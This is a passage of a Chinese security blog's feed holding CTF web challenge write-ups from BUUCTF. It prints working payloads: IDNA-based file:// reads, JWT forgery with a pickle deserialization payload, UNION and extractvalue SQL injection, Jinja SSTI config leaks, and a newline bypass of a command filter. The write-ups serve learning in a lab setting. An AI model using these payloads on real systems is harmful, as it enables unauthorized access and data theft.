class="string">"http://suctf.c&#123;&#125;"</span>.format(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                print(<span class="string">"str: "</span>+uni+<span class="string">' unicode: \\u'</span>+str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure><p>得到可用字符：</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/42.png" class="" title="Da4er"><p>接着就是nginx目录的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">├── client_body_temp</span><br><span class="line">├── conf                              #配置文件目录</span><br><span class="line">│   ├── fastcgi.conf</span><br><span class="line">│   ├── fastcgi.conf.default</span><br><span class="line">│   ├── fastcgi_params</span><br><span class="line">│   ├── fastcgi_params.default</span><br><span class="line">│   ├── koi-utf</span><br><span class="line">│   ├── koi-win</span><br><span class="line">│   ├── mime.types</span><br><span class="line">│   ├── mime.types.default</span><br><span class="line">│   ├── nginx.conf                      #主配置文件</span><br><span class="line">│   ├── nginx.conf.default</span><br><span class="line">│   ├── scgi_params</span><br><span class="line">│   ├── scgi_params.default</span><br><span class="line">│   ├── uwsgi_params</span><br><span class="line">│   ├── uwsgi_params.default</span><br><span class="line">│   └── win-utf</span><br><span class="line">├── fastcgi_temp</span><br><span class="line">├── html                                #初始的静态页面存放目录</span><br><span class="line">│   ├── 50x.html</span><br><span class="line">│   └── index.html</span><br><span class="line">├── logs                                #日志目录</span><br><span class="line">│   ├── access.log</span><br><span class="line">│   ├── error.log</span><br><span class="line">│   └── nginx.pid</span><br><span class="line">├── proxy_temp</span><br><span class="line">├── sbin                                #启动目录</span><br><span class="line">│   └── nginx</span><br><span class="line">├── scgi_temp</span><br><span class="line">└── uwsgi_temp</span><br></pre></td></tr></table></figure><p>所以我们通过file://来读取配置文件查看一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;suctf.cＣ&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/43.png" class="" title="Da4er"><p>最后查看flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;suctf.cＣ&#x2F;usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure><hr><h3 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h3><p>首先注册一下，找到lv6会员号，在181页，单击结账。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/44.png" class="" title="Da4er"><p>将discount设为很小的数，直接爆出后台地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b1g_m4mber</span><br></pre></td></tr></table></figure><p>访问会说不是admin，查看cookie发现有个JWK，知道是基于token验证的，所以可以伪造身份。关于JWK：<a href="https://www.cnblogs.com/cjsblog/p/9277677.html">博客</a><br>所以我要先破解key值，GitHub上有一个爆破工具：<a href="https://github.com/brendan-rius/c-jwt-cracker">1</a><br>爆破出来：</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/45.png" class="" title="Da4er"><p>然后在<a href="https://jwt.io/进行伪造。">https://jwt.io/进行伪造。</a></p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/46.png" class="" title="Da4er"><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/47.png" class="" title="Da4er"><p>查看源代码发现：<a href="http://www.zip">www.zip</a></p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/48.png" class="" title="Da4er"><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/49.png" class="" title="Da4er"><p>反序列化脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&#39;&#x2F;flag.txt&#39;,&#39;r&#39;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a &#x3D; pickle.dumps(payload())</span><br><span class="line">a &#x3D; urllib.quote(a)</span><br><span class="line">print a</span><br></pre></td></tr></table></figure><p>在become上传入：</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/50.png" class="" title="Da4er"><hr><h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p> 抓一下登录包，可以发现：<br> <img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/51.png" class="" title="Da4er"><br> base32->base64解密后，可以知道构造的sql语句 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure><p>经过测试发现，username和password是分开验证的。而且没有过滤union select。<br>这里就有一个知识点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当union select查询不存在的数据的时候会自己构造一组虚拟数据。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;0&#39; union select 1,&#39;admin&#39;,&#39;111&#39;,1;</span><br></pre></td></tr></table></figure><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/52.png" class="" title="Da4er"><p>所有我们可以用这个来绕过密码的验证。<br>接着我们来猜后端的验证代码大致如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if($arr[&#39;username&#39;]!&#x3D;&#x3D;&#39;admin&#39;)&#123;</span><br><span class="line">    echo &quot;Wrong User&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    if($arr[&#39;password&#39;]&#x3D;&#x3D;md5($password))&#123;</span><br><span class="line">        echo &#39;Yes&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &#39;Wrong pass&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#39; union select 1,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;#&amp;pw&#x3D;123456</span><br></pre></td></tr></table></figure><hr><h3 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h3><p>打开题目拿到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>发现是一个ssti模板注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[&#39;FLAG&#39;] &#x3D; os.environ.pop(&#39;FLAG&#39;)</span><br></pre></td></tr></table></figure><p>上面这段代码所有flag在config里面，但是有过滤:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s &#x3D; s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)</span><br><span class="line">   blacklist &#x3D; [&#39;config&#39;, &#39;self&#39;]</span><br><span class="line">   return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;&#x3D;None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s</span><br></pre></td></tr></table></figure><p>这个代码把传入的config全部置为None。所以我们不能直接输入<br>接着寻找别的解法：<br>找到两种payload：</p><p>python还有一些内置函数，比如url_for和get_flashed_messages</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;</span><br></pre></td></tr></table></figure><p>将这个payload拆分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__</span><br></pre></td></tr></table></figure><p>这个是查看当前的所有全局变量</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/53.png" class="" title="Da4er"><p>发现有个current.app应该是当前的app，所以构造了如上的payload。</p><p>第二个是get_flashed_messages</p><blockquote><p>返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;</span><br></pre></td></tr></table></figure><p>随便输入一个payload得到flag:</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/54.png" class="" title="Da4er"><hr><h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><p>知识点：Unicode编码问题<br>参考博客：<a href="https://xz.aliyun.com/t/5402#toc-0">https://xz.aliyun.com/t/5402#toc-0</a><br>这道题主要利用的是Unicode处理数字的时候，存在显示问题。不同国家的数字经过unicode编码后的结果可能和数字表示的原意不同：<br><strong>例如孟加拉语的0-9是০ ১ ২ ৩ ৪ ৫ ৬ ৭ ৮ ৯，但是这里的৪ (U+09EA) 实际上是数字4。</strong><br>解题：打开题目，查看源码，发现题目是utf-8编码。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/59.png" class="" title="Da4er"><p>在测试后发现，当我们买了第四个商品时，就会出现flag。但是限制了第二个输入框只能输入一个字符：</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/60.png" class="" title="Da4er"><p>但是题目是经过utf-8编码的，所以我们可以使用unicode编码问题：<br>在这个网址上寻找别的unicode编码：<a href="https://www.compart.com/en/unicode">https://www.compart.com/en/unicode</a><br><strong>注意在这个网址上搜索时，要填入英文。</strong><br>我们找到一个字符：<img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/61.png" class="" title="Da4er"><br>utf-8编码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xF0 0x90 0x84 0xA3</span><br></pre></td></tr></table></figure><p>将0x改成%，提交即可得到flag。</p><hr><h3 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h3><p>知识点：git源码泄露+源码恢复；二次注入</p><p><a href="https://blog.csdn.net/weixin_43940853/article/details/105121265">https://blog.csdn.net/weixin_43940853/article/details/105121265</a></p><p><a href="https://www.cnblogs.com/Tkitn/p/11648456.html">https://www.cnblogs.com/Tkitn/p/11648456.html</a></p><hr><h3 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h3><p>上传.htaccess 比赛的时候是可以上传shtml，发送成功解析，但是在BUU上就不行了。</p><hr><h3 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h3><p>两种解法<br>知识点：<br>一.<br>preg_match匹配问题：只能匹配第一行，我们可以通过%0a换行。<br>二.<br>PCRE正则回溯绕过限制，原理：PHP中的正则库PCRE是基于NFA。<br><strong>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</strong><br>这就造成了回溯绕过限制，因为PHP回溯次数就是有限制的：</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/66.png" class="" title="Da4er"><p>以英文为准，上限次数为1000000.<br>当超过上限次数的时候，正则匹配会返回false，从而绕过过滤<br>参考博客：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a><br>做题:<br>一。<br>更改环境变量，使用绝对路径的cat命令。<br>打开题目说要输入json格式化的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</span><br></pre></td></tr></table></figure><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/62.png" class="" title="Da4er"><p>当我们尝试cat /flag的时候发现被拦截。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/63.png" class="" title="Da4er"><p>尝试了多种方法，都没有绕过。只能上网找wp2333.。。<br>发现网上都是拿源码来说的，贴上源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">'PATH=/home/rceservice/jail'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Attempting to run command:&lt;br/&gt;'</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="keyword">true</span>)[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="keyword">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Invalid input'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现过滤很多字符，怨不得绕不过去2333<br>但是发现这个过滤代码是通过preg_match匹配过滤的，preg_match只能匹配第一行。所以我们可以通过%0a绕过。<br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%0a&quot;cmd&quot;:&quot;ls &#x2F;home&#x2F;rceservice&#x2F;&quot;%0a&#125;</span><br></pre></td></tr></table></figure><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/64.png" class="" title="Da4er"><p>但是尝试直接catflag的时候没有显示，继续看源码发现题目改变了环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">putenv(&#39;PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail&#39;)</span><br></pre></td></tr></table></figure><p>所以我们不能直接使用cat，必须通过绝对路径，最后的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%0a&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0a&#125;</span><br></pre></td></tr></table></figure><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/65.png" class="" title="Da4er"><p>二。<br>正则回溯绕过，附上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = <span class="string">'&#123;"cmd":"/bin/cat /home/rceservice/flag","da4er":"'</span>+<span class="string">"a"</span>*(<span class="number">1000000</span>)+<span class="string">'"&#125;'</span></span><br><span class="line">url = <span class="string">"http://0145917c-81ab-4294-9b06-cbe502323d99.node3.buuoj.cn/?cmd=&#123;&#125;"</span>.format(payload)</span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure><p>但是题目是get请求所以打不过去很大的数据包，这个解法没有复现成功。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/67.png" class="" title="Da4er"><hr><h3 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h3><p>知识点：报错注入，extractvalue报错最多只能出来30个字符。<br>通过left和right函数截断报错。<br>做题：<br>直接上payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;dmin%27or(extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)))))%23&amp;password&#x3D;admin111</span><br><span class="line">username&#x3D;dmin%27or(extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1)))))%23&amp;password&#x3D;admin111</span><br></pre></td></tr></table></figure><p>通过right和left来截断报错。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/68.png" class="" title="Da4er"></script></p>]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;RoarCTF-2019-Easy-Calc&quot;&gt;&lt;a href=&quot;#RoarCTF-2019-Easy-Calc&quot; class=&quot;headerlink&quot; title=&quot;[RoarCTF 2019]Easy Calc&quot;&gt;&lt;/a&gt;[RoarCTF 2019]Easy Calc&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;知识点：PHP字符串的解析漏洞。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&amp;gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替，如下图：&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>关于我</title>
    <link href="https://da4er.top/%E5%85%B3%E4%BA%8E%E6%88%91.html"/>
    <id>https://da4er.top/%E5%85%B3%E4%BA%8E%E6%88%91.html</id>
    <published>2020-03-02T08:29:56.000Z</published>
    <updated>2020-06-08T08:24:38.463Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><img src="/%E5%85%B3%E4%BA%8E%E6%88%91/1.jpg" class><p>努力赶上大佬的安全小白；</p><hr><p>2020年计划：<br>开发一个MVC架构的项目 √</p><p>用Python写一个Scrapy的分布式爬虫 √</p><p>用Python写一个简单的扫描器；</p><p>努力刷题，让自己在CTF小有成就；</p><p>挖掘漏洞，今年提交10个有质量的漏洞；</p><p>Java Web 基础学习。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;img src=&quot;/%E5%85%B3%E4%BA%8E%E6%88%91/1.jpg&quot; class&gt;
&lt;p&gt;努力赶上大佬的安全小白；&lt;/p&gt;
&lt;hr&gt;

      
    
    </summary>
    
    
    
  </entry>
  
</feed>
